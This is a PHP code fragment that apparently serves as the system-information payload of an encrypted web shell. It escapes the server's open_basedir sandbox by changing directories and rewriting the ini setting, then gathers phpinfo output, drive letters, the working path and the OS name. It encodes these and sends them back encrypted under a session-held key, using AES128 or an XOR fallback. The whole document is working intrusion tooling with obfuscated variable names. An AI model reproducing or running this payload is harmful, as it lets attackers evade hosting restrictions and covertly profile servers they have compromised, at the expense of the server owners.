error_reporting(0);
function bypass_open_basedir(){
    if(!@file_exists('bypass_open_basedir')){
        @mkdir('bypass_open_basedir');
    }
    @chdir('bypass_open_basedir');
    @ini_set('open_basedir','..');
    @$_Ei34Ww_sQDfq_FILENAME = @dirname($_SERVER['SCRIPT_FILENAME']);
    @$_Ei34Ww_sQDfq_path = str_replace("\\",'/',$_Ei34Ww_sQDfq_FILENAME);
    @$_Ei34Ww_sQDfq_num = substr_count($_Ei34Ww_sQDfq_path,'/') + 1;
    $_Ei34Ww_sQDfq_i = 0;
    while($_Ei34Ww_sQDfq_i < $_Ei34Ww_sQDfq_num){
        @chdir('..');
        $_Ei34Ww_sQDfq_i++;
    }
    @ini_set('open_basedir','/');
    @rmdir($_Ei34Ww_sQDfq_FILENAME.'/'.'bypass_open_basedir');
}
bypass_open_basedir();
function main($whatever) {
    ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean();
    $driveList ="";
    if (stristr(PHP_OS,"windows")||stristr(PHP_OS,"winnt"))
    {
        for($i=65;$i<=90;$i++)
    	{
    		$drive=chr($i).':/';
    		file_exists($drive) ? $driveList=$driveList.$drive.";":'';
    	}
    }
	else
	{
		$driveList="/";
	}
    $currentPath=getcwd();
    //echo "phpinfo=".$info."\n"."currentPath=".$currentPath."\n"."driveList=".$driveList;
    $osInfo=PHP_OS;
    $result=array("basicInfo"=>base64_encode($info),"driveList"=>base64_encode($driveList),"currentPath"=>base64_encode($currentPath),"osInfo"=>base64_encode($osInfo));
    //echo json_encode($result);
    session_start();
    $key=$_SESSION['k'];
    //echo json_encode($result);
    //echo openssl_encrypt(json_encode($result), "AES128", $key);
    echo encrypt(json_encode($result), $key);
}

function encrypt($data,$key)
{
	if(!extension_loaded('openssl'))
    	{
    		for($i=0;$i<strlen($data);$i++) {
    			 $data[$i] = $data[$i]^$key[$i+1&15]; 
    			}
			return $data;
    	}
    else
    	{
    		return openssl_encrypt($data, "AES128", $key);
    	}
}